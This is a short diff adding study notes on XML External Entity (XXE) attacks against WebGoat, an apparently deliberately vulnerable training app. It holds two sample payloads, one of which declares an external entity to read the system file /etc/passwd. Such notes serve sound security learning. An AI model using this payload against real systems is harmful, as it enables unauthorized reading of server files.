@@ -1,0 +1,9 @@
+A4 (XML External Entities)
+	* XXE - WebGoat
+		<?xml version="1.0"?>
+		<!DOCTYPE replace [<!ENTITY xxe "test-xxe"> ]>
+		<comment>  <text>&xxe;</text></comment>
+
+		<?xml version="1.0"?>
+		<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+		<comment>  <text>&xxe;</text></comment>
